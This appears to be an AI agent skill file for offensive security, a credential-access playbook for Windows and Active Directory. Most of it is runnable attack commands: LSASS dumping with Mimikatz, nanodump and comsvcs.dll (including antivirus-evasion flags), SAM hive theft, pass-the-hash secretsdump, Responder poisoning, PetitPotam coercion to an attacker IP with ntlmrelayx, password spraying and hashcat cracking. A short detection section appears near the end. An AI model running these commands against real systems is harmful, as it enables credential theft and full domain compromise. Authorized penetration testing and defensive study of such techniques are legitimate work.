---
name: credential-access
description: "Credential extraction and capture — LSASS dumping, SAM/SECURITY hive extraction, DPAPI decryption, NTLM relay, Responder poisoning, password spraying, hash cracking."
allowed-tools: Bash Read Write
metadata:
  subdomain: credential-access
  when_to_use: "credential access, dump credentials, LSASS, mimikatz, password spray, NTLM relay, Responder, hash cracking, SAM dump, DPAPI, secretsdump"
  tags: credentials, lsass, mimikatz, ntlm, relay, spray, hashcat, dpapi, responder
  mitre_attack: T1003.001, T1003.002, T1003.004, T1557.001, T1110.003, T1187
---

# Credential Access Knowledge Base

Credential access extracts authentication material from compromised systems and network traffic. Captured credentials enable lateral movement, privilege escalation, and persistent access. Always validate scope authorization before executing credential attacks.

## Quick Reference
```bash
# LSASS dump via comsvcs.dll (living-off-the-land, no tool upload)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\out.dmp full

# SAM/SYSTEM hive extraction
reg save HKLM\SAM C:\Windows\Temp\SAM && reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM && reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Remote secretsdump (domain creds required)
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<TARGET>' -outputfile secretsdump_<TARGET>

# Responder LLMNR/NBT-NS poisoning
responder -I eth0 -dwPv | tee responder_<TARGET>.log

# Password spray with NetExec
nxc smb <TARGET> -u users.txt -p 'Spring2026!' --continue-on-success | tee spray_<TARGET>.log

# Crack NTLM hashes
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt
```

## MITRE ATT&CK Mapping

| Technique ID | Name | Tools |
|-------------|------|-------|
| T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz, nanodump, comsvcs.dll, HandleKatz |
| T1003.002 | OS Credential Dumping: SAM | reg save, secretsdump.py |
| T1003.004 | OS Credential Dumping: LSA Secrets | secretsdump.py, Mimikatz |
| T1557.001 | LLMNR/NBT-NS Poisoning | Responder |
| T1110.003 | Password Spraying | CrackMapExec, NetExec, DomainPasswordSpray |
| T1187 | Forced Authentication | ntlmrelayx.py, PetitPotam |

## 1. LSASS Memory Dumping

### Mimikatz — sekurlsa Module
```powershell
# Dump all logon passwords from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > mimikatz_<TARGET>.txt

# Dump NTLM hashes only
mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"

# Dump Kerberos tickets from memory
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Dump cached domain credentials
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

### nanodump (Stealthier LSASS Dump)
```bash
# Direct LSASS dump — avoids Mimikatz signatures
nanodump.exe --write C:\Windows\Temp\out.dmp

# Fork LSASS process first (avoids direct handle to lsass.exe)
nanodump.exe --fork --write C:\Windows\Temp\out.dmp

# Use invalid signature to bypass AV file scanning
nanodump.exe --write C:\Windows\Temp\out.dmp --invalid

# Parse dump offline with Mimikatz
mimikatz.exe "sekurlsa::minidump out.dmp" "sekurlsa::logonpasswords" "exit"
```

### comsvcs.dll MiniDump (LOLBin)
```powershell
# Get LSASS PID
$lsassPid = (Get-Process lsass).Id

# Dump using comsvcs.dll — no tool upload required
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full

# Alternative: use cmd with tasklist
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

### HandleKatz (Handle Duplication)
```bash
# Uses handle duplication to access LSASS — bypasses PPL in some configs
HandleKatz.exe --pid:<LSASS_PID> --outfile:C:\Windows\Temp\lsass.dmp

# Parse the dump offline
pypykatz lsa minidump lsass.dmp -o handlekatz_<TARGET>.txt
```

## 2. SAM/SECURITY/SYSTEM Hive Extraction

### Registry Save (Local Admin Required)
```cmd
:: Save SAM, SYSTEM, and SECURITY hives
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

:: Transfer to attack machine, then extract
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL -outputfile local_hashes
```

### Remote Extraction with secretsdump.py
```bash
# With plaintext credentials
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<TARGET>' -outputfile secretsdump_<TARGET>

# With NTLM hash (pass-the-hash)
secretsdump.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> -outputfile secretsdump_<TARGET>

# Extract only specific secret types
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<TARGET>' -just-dc-ntlm   # DC: NTLM hashes only
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<TARGET>' -just-dc         # DC: All including Kerberos keys

# Volume Shadow Copy method (avoids locked file issues)
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<TARGET>' -use-vss
```

## 3. DPAPI Secrets

### SharpDPAPI — Browser & Credential Vault
```powershell
# Dump all DPAPI-protected credentials for current user
SharpDPAPI.exe triage

# Decrypt Chrome/Edge saved passwords (current user context)
SharpDPAPI.exe credentials /target:C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data

# Machine DPAPI keys (requires SYSTEM)
SharpDPAPI.exe machinetriage

# Decrypt saved RDP credentials
SharpDPAPI.exe rdg /unprotect

# With domain backup key (extracts all user DPAPI secrets domain-wide)
SharpDPAPI.exe backupkey /file:backup.pvk /target:<DC_IP>
```

### Browser Password Extraction
```powershell
# Mimikatz DPAPI approach
mimikatz.exe "dpapi::chrome /in:\"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data\"" "exit"

# Decrypt Windows Credential Manager vault
mimikatz.exe "vault::cred /patch" "exit"
```

## 4. NTLM Hash Capture — Responder

### LLMNR/NBT-NS/mDNS Poisoning
```bash
# Start Responder with all poisoners active
responder -I eth0 -dwPv | tee responder_<TARGET>.log

# Analysis mode only (capture without poisoning — safe recon)
responder -I eth0 -A

# Capture NTLMv2 hashes to specific log directory
responder -I eth0 -dwPv --lm

# Key flags
# -d  DHCP poisoning (WPAD via DHCP)
# -w  WPAD rogue proxy
# -P  Force NTLM auth for WPAD
# -v  Verbose output
```

### Responder Captured Hash Format
```
# NTLMv2 hash format (NetNTLMv2):
<USER>::<DOMAIN>:<ServerChallenge>:<NTProofStr>:<NTLMv2Response>

# Crack with Hashcat mode 5600
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 5. NTLM Relay Attacks

### ntlmrelayx.py — Multi-Protocol Relay
```bash
# Relay to SMB for command execution
ntlmrelayx.py -t smb://<TARGET> -smb2support -c "whoami > C:\Windows\Temp\pwned.txt"

# Relay to LDAP for AD object manipulation (requires LDAP signing disabled)
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <CONTROLLED_USER>

# Relay to HTTP (ADCS web enrollment — ESC8)
ntlmrelayx.py -t http://<ADCS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Relay to multiple targets from file
ntlmrelayx.py -tf relay_targets.txt -smb2support

# SOCKS proxy mode (maintain relayed sessions)
ntlmrelayx.py -t smb://<TARGET> -smb2support -socks
# Then use proxychains with the relayed session
```

### PetitPotam — Authentication Coercion
```bash
# Coerce target to authenticate to attacker (triggers NTLM auth)
python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>

# With credentials (more reliable)
python3 PetitPotam.py -u '<USER>' -p '<PASS>' -d '<DOMAIN>' <ATTACKER_IP> <TARGET_IP>

# Combine: PetitPotam coercion → ntlmrelayx relay
# Terminal 1: ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>
# Terminal 2: python3 PetitPotam.py <ATTACKER_IP> <TARGET_WITH_UNCONSTRAINED_DELEG>
```

### Relay Target Discovery
```bash
# Find hosts without SMB signing (vulnerable to relay)
nxc smb <SUBNET>/24 --gen-relay-list relay_targets.txt

# Check LDAP signing/channel binding on DC
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -M ldap-checker
```

## 6. Password Spraying

### CrackMapExec / NetExec
```bash
# Spray single password across user list (SMB)
nxc smb <TARGET> -u users.txt -p 'Spring2026!' --continue-on-success | tee spray_<TARGET>.log

# Spray with multiple passwords (one per interval to avoid lockout)
nxc smb <TARGET> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Kerberos pre-auth spray (stealthier — no Windows logon events)
nxc smb <TARGET> -u users.txt -p 'Spring2026!' -k

# LDAP spray
nxc ldap <DC_IP> -u users.txt -p 'Spring2026!'

# Check password policy FIRST
nxc smb <TARGET> -u '<USER>' -p '<PASS>' --pass-pol
```

### DomainPasswordSpray (PowerShell)
```powershell
# Import and spray (auto-generates user list from AD)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2026!' -OutFile spray_results.txt

# With specific user list and lockout awareness
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 'Spring2026!' -OutFile spray_results.txt -Force
```

### Lockout Awareness
```
CRITICAL: Before spraying, always check:
1. Account lockout threshold (usually 3-5 attempts)
2. Observation window (usually 30 minutes)
3. Lockout duration (usually 30-60 minutes)

RULE: Stay at least 1 attempt BELOW the lockout threshold per observation window.
Example: If threshold=5, max 4 attempts per 30-minute window.
```

## 7. Offline Hash Cracking — Hashcat

### Common Hash Modes
| Mode | Hash Type | Example Source |
|------|-----------|----------------|
| 1000 | NTLM | SAM dump, secretsdump, DCSync |
| 5600 | NetNTLMv2 | Responder capture |
| 13100 | Kerberoast (TGS-REP etype 23) | Rubeus, GetUserSPNs.py |
| 18200 | AS-REP Roast (etype 23) | GetNPUsers.py |
| 3000 | LM | Legacy systems |
| 1100 | Domain Cached Credentials (DCC) | SECURITY hive |
| 2100 | Domain Cached Credentials 2 (DCC2) | Modern Windows |

### Cracking Commands
```bash
# NTLM hashes from secretsdump
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# NetNTLMv2 from Responder
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_ntlmv2.txt

# Kerberoast TGS tickets
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_kerb.txt

# AS-REP roast
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt

# Rule-based attack (more effective than straight wordlist)
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask attack for common patterns (Company + Season + Year + Special)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s'

# Show cracked results
hashcat -m 1000 hashes.txt --show
```

## Tools & Resources

| Tool | Purpose | Key Flags |
|------|---------|-----------|
| Mimikatz | LSASS dump, ticket extraction, DPAPI | `sekurlsa::logonpasswords`, `sekurlsa::tickets` |
| nanodump | Stealthy LSASS dump | `--fork`, `--invalid` |
| secretsdump.py | Remote SAM/LSA/NTDS extraction | `-just-dc-ntlm`, `-use-vss` |
| SharpDPAPI | DPAPI secret decryption | `triage`, `machinetriage` |
| Responder | LLMNR/NBT-NS/mDNS poisoning | `-I eth0 -dwPv` |
| ntlmrelayx.py | NTLM relay to SMB/LDAP/HTTP | `-t`, `-tf`, `-socks`, `--adcs` |
| PetitPotam | NTLM auth coercion via MS-EFSRPC | Target IP + listener IP |
| NetExec (nxc) | Password spray, enum, relay-list | `--pass-pol`, `--gen-relay-list` |
| DomainPasswordSpray | AD-native PowerShell spraying | `-Password`, `-UserList` |
| Hashcat | GPU-accelerated hash cracking | `-m`, `-r`, `-a 3` (mask) |
| pypykatz | Python Mimikatz (parse dumps offline) | `lsa minidump <file>` |

## Detection Signatures

| Event ID | Source | Indicator |
|----------|--------|-----------|
| 4625 | Security | Failed logon — spray detection (volume of failures) |
| 4648 | Security | Explicit credential logon — credential reuse/relay |
| 4776 | Security | NTLM authentication — credential validation |
| 4771 | Security | Kerberos pre-auth failure — Kerberos spray detection |
| 10 (Sysmon) | Sysmon | LSASS process access — credential dumping tool |
| 7 (Sysmon) | Sysmon | Image loaded in LSASS — DLL injection into LSASS |
| 1 (Sysmon) | Sysmon | Process create — Mimikatz/nanodump execution |
| 4697 | Security | Service installed — secretsdump remote service |
| LSASS access | EDR | Direct LSASS handle open (PROCESS_VM_READ) |
| reg.exe | EDR | Registry save of SAM/SYSTEM/SECURITY hives |

### Key Detection Rules
```
# Sigma rule indicators for LSASS access
- TargetImage|endswith: '\lsass.exe'
  GrantedAccess|contains:
    - '0x1010'    # PROCESS_VM_READ + PROCESS_QUERY_INFORMATION
    - '0x1410'    # + PROCESS_DUP_HANDLE
    - '0x1FFFFF'  # PROCESS_ALL_ACCESS

# Responder detection: unexpected LLMNR/NBT-NS responses
- Source port 5355 (LLMNR) or 137 (NBT-NS) from non-DNS server

# Password spray pattern: >5 Event 4625 from same source in 10 minutes
```

## Decision Gate

```
Credential Access ─┬─► Lateral Movement
                   │    (use captured hashes/tickets to move to new hosts)
                   │
                   └─► Privilege Escalation
                        (use extracted creds to escalate on current host or domain)
```

**Next steps after credential extraction:**
- **Valid plaintext/NTLM hash** → Pass-the-Hash via CrackMapExec/Impacket → Lateral Movement skill
- **Kerberos tickets** → Pass-the-Ticket via Rubeus → Lateral Movement skill
- **Domain Admin hash** → DCSync for full domain compromise → Lateral Movement skill
- **Local admin hash** → Spray across hosts for reuse → Lateral Movement skill
- **Cracked password** → Re-spray for password reuse → additional Credential Access
- **Service account creds** → Check for privilege escalation paths → Privilege Escalation skill

## Bundled Resources

### References
- `references/lsass-techniques.md` — LSASS dumping method comparison (nanodump/comsvcs.dll/ProcDump/Mimikatz), stealth tiers, SAM/SECURITY hive extraction, DPAPI secrets, pypykatz offline parsing, detection indicators. Read when choosing the optimal credential dumping technique for the target's defensive posture.
